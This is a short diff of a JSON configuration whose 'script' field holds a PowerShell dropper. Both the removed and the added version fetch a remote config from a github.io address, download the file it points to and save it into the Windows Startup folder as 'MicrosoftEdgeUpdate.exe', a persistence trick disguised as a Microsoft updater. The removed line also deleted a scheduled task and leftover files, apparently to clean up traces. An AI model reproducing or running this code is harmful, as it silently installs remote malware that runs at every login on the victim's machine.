@@ -1,5 +1,3 @@
 {
-  "script": "$c=Invoke-RestMethod 'https://vvecfs.github.io/1235/config.json';Invoke-WebRequest $c.url -OutFile \"$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftEdgeUpdate.exe\"; schtasks /delete /tn windows_random /f; del /f /q "%UserProfile%\Appdata\Local\windows_random.vbs"; del /f /q "%UserProfile%\Appdata\Roaming\windows_random.xml"
-; del /f /q "%UserProfile%\Downloads\CPU.exe"
-; "
+  "script": "$c=Invoke-RestMethod 'https://vvecfs.github.io/1235/config.json'; Invoke-WebRequest $c.url -OutFile \"$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\MicrosoftEdgeUpdate.exe\""
 }
